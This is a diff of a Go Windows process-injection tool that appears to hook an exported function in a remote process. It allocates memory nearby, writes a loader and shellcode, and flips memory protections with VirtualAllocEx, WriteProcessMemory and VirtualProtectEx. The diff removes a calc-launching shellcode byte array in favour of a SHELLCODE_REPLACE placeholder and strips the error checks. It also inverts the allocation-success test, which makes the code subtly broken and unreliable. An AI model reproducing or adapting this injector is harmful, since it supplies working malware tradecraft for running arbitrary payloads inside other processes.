@@ -33,17 +33,7 @@ var (
 	uintsize = unsafe.Sizeof(uintptr(0))
 
 	// calc
-	shellcode = []byte{
-		0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
-		0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
-		0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
-		0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
-		0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
-		0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
-		0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
-		0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
-		0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3,
-	}
+        SHELLCODE_REPLACE
 		
 	shellcodeLoader = []byte{
 		0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9,
@@ -67,27 +57,24 @@ func GenerateHook(originalBytes []byte) {
 
 func FindMemoryHole(pHandle , exportAddress, size uintptr) (uintptr, error) {
 	remoteLoaderAddress := uintptr(0)
-	found := false
+	errVirtualAlloc := error(nil)
 
 	for remoteLoaderAddress = (exportAddress & 0xFFFFFFFFFFF70000) - 0x70000000; remoteLoaderAddress < exportAddress + 0x70000000; remoteLoaderAddress += 0x10000 {
 		fmt.Printf("[+] Trying address : @%x\n", remoteLoaderAddress)
-		_, _, errVirtualAlloc := VirtualAllocEx.Call(
+		_, _, errVirtualAlloc = VirtualAllocEx.Call(
 			uintptr(pHandle),
 			remoteLoaderAddress,
 			uintptr(size),
 			uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
 			uintptr(windows.PAGE_READWRITE),
 		)
-		if errVirtualAlloc == nil || errVirtualAlloc.Error() == "The operation completed successfully."{
-			found = true
+		fmt.Printf("%s\n", errVirtualAlloc.Error())
+		if errVirtualAlloc !=  nil && errVirtualAlloc.Error() != "The operation completed successfully." {
 			fmt.Printf("[+] Successfully allocated : @%x\n", remoteLoaderAddress)
 			break
 		}
 	}
 
-	if !found {
-		return 0, fmt.Errorf("[-]Could not find memory hole")
-	}
 
 	return remoteLoaderAddress, nil
 }
@@ -113,7 +100,7 @@ func main() {
 	remote_fct := DLL.NewProc(*function)
 	exportAddress := remote_fct.Addr()
 
-	// fmt.Printf("[+] DEBUG - Export address: %x\n", exportAddress)
+	fmt.Printf("[+] DEBUG - Export address: %x\n", exportAddress)
 	
 	loaderAddress, holeErr := FindMemoryHole(uintptr(pHandle), exportAddress, uintptr(payloadSize))
 	if holeErr != nil {
@@ -122,22 +109,19 @@ func main() {
 
 	var originalBytes []byte = make([]byte, 8)
 	// Read original bytes of the remote function
-	_, _, errReadFunction := ReadProcessMemory.Call(
+	ReadProcessMemory.Call(
 		uintptr(pHandle), 
 		exportAddress, 
 		uintptr(unsafe.Pointer(&originalBytes[0])), 
 		uintptr(len(originalBytes)))
-	if errReadFunction != nil && errReadFunction.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("Error monitoring function :%s\r\n", errReadFunction.Error()))
-	}
 
-	// fmt.Printf("[+] DEBUG - Original bytes: 0x%x\n", originalBytes)
+	fmt.Printf("[+] DEBUG - Original bytes: 0x%x\n", originalBytes)
 	
 	// Write function original bytes to loader, so it can restore after one-time execution
 	GenerateHook(originalBytes)
 
 	// Unprotect remote function memory
-	_, _, errVirtualProtectEx := VirtualProtectEx.Call(
+	VirtualProtectEx.Call(
 		uintptr(pHandle), 
 		exportAddress, 
 		8,
@@ -147,66 +131,53 @@ func main() {
 	var relativeLoaderAddress = (uint32)((uint64)(loaderAddress) - ((uint64)(exportAddress) + 5));
 	relativeLoaderAddressArray := make([]byte, uintsize)
 	binary.LittleEndian.PutUint32(relativeLoaderAddressArray, relativeLoaderAddress)
-	// fmt.Printf("[+] DEBUG - Relative loader address: %x\n", relativeLoaderAddress)
+	fmt.Printf("[+] DEBUG - Relative loader address: %x\n", relativeLoaderAddress)
 
 	callOpCode[1] = relativeLoaderAddressArray[0]
 	callOpCode[2] = relativeLoaderAddressArray[1]
 	callOpCode[3] = relativeLoaderAddressArray[2]
 	callOpCode[4] = relativeLoaderAddressArray[3]
 	
-	// fmt.Printf("[+] DEBUG - callOpCode : 0x%x\n", callOpCode)
+	fmt.Printf("[+] DEBUG - callOpCode : 0x%x\n", callOpCode)
 
 	// Hook the remote function
-	_, _, errWriteHook := WriteProcessMemory.Call(
+	WriteProcessMemory.Call(
 		uintptr(pHandle), 
 		exportAddress, 
 		(uintptr)(unsafe.Pointer(&callOpCode[0])), 
 		uintptr(len(callOpCode)))
-	if errWriteHook != nil && errWriteHook.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("[!] Failed to hook the function :%s\r\n", errWriteHook.Error()))
-	}
-	// fmt.Printf("[+] DEBUG - bytesRead : %d\n", bytesRead)
 
 
 	newBytes := make([]byte, uintsize)
 	binary.LittleEndian.PutUint64(newBytes, uint64(exportAddress))
-	// fmt.Printf("[+] DEBUG - newBytes : %x\n", newBytes)
+	fmt.Printf("[+] DEBUG - newBytes : %x\n", newBytes)
 
 	// Unprotect loader allocated memory
-	_, _, errVirtualProtectEx = VirtualProtectEx.Call(
+	VirtualProtectEx.Call(
 		uintptr(pHandle), 
 		loaderAddress, 
 		uintptr(payloadSize), 
 		windows.PAGE_READWRITE, 
 		uintptr(unsafe.Pointer(&oldProtect)))
-	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("Error protecting payload memory:%s\r\n", errVirtualProtectEx.Error()))
-	}
 
 	// Write loader to allocated memory
-	_, _, errWriteLoader := WriteProcessMemory.Call(
+	WriteProcessMemory.Call(
 		uintptr(pHandle), 
 		loaderAddress, 
 		(uintptr)(unsafe.Pointer(&payload[0])), 
 		uintptr(payloadSize))
-	if errWriteLoader != nil && errWriteLoader.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("[!]Error writing loader:%s\r\n", errWriteLoader.Error()))
-	}
 
 	// Protect loader allocated memory
-	_, _, errVirtualProtectEx = VirtualProtectEx.Call(
+	VirtualProtectEx.Call(
 		uintptr(pHandle), 
 		loaderAddress, 
 		uintptr(payloadSize), 
 		windows.PAGE_EXECUTE_READ, 
 		uintptr(unsafe.Pointer(&oldProtect)))
-	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("Error protecting loader :%s\r\n", errVirtualProtectEx.Error()))
-	}
 
 	fmt.Println("[+] Shellcode injected, waiting 60s for the hook to be called...")
 
-	delay := 60 * time.Second
+	delay := 10 * time.Second
 	var endTime <- chan time.Time
 	endTime = time.After(delay)
 
@@ -219,19 +190,16 @@ func main() {
 		default:
 			read := 0
 			var buf []byte = make([]byte, 8)
-
-			_, _, errReadFunction := ReadProcessMemory.Call(
+			
+			ReadProcessMemory.Call(
 				uintptr(pHandle), 
 				exportAddress, 
 				uintptr(unsafe.Pointer(&buf[0])), 
 				uintptr(len(buf)), 
 				uintptr(unsafe.Pointer(&read)))
-			if errReadFunction != nil && errReadFunction.Error() != "The operation completed successfully." {
-				log.Fatal(fmt.Sprintf("Error monitoring function :%s\r\n", errReadFunction.Error()))
-			}
-			// fmt.Println("[+] Monitoring...")
-			// fmt.Printf("[+] Read bytes: %x\n", buf)
-			// fmt.Printf("[+] Original bytes: %x\n", originalBytes)
+			fmt.Println("[+] Monitoring...")
+			fmt.Printf("[+] Read bytes: %x\n", buf)
+			fmt.Printf("[+] Original bytes: %x\n", originalBytes)
 
 			if bytes.Equal(buf, originalBytes) {
 				fmt.Println("[+] Hook called")
@@ -251,24 +219,18 @@ func main() {
 	if executed {
 		fmt.Println("[+] Cleaning up")
 
-		_, _, errVirtualProtectEx = VirtualProtectEx.Call(
+		VirtualProtectEx.Call(
 			uintptr(pHandle), 
 			exportAddress, 
 			8, 
 			windows.PAGE_EXECUTE_READ, 
 			uintptr(unsafe.Pointer(&oldProtect)))
-		if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
-			log.Fatal(fmt.Sprintf("Error protecting back hooked function :%s\r\n", errVirtualProtectEx.Error()))
-		}
 
-		_, _, errVirtualFreeEx := VirtualFreeEx.Call(
+		VirtualFreeEx.Call(
 			uintptr(pHandle), 
 			loaderAddress, 
 			0, 
 			windows.MEM_RELEASE)
-		if errVirtualFreeEx != nil && errVirtualFreeEx.Error() != "The operation completed successfully." {
-			log.Fatal(fmt.Sprintf("Error freeing payload memory space :%s\r\n", errVirtualFreeEx.Error()))
-		}
 
 	}
 
